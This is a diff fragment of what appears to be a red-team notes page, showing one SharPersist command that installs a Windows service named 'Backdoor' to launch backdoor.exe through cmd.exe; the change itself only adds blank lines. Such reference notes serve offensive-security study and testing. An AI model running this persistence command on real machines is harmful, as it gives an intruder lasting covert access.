@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:29.727924+00:00'
 ```bash
 SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
 ```
+
+
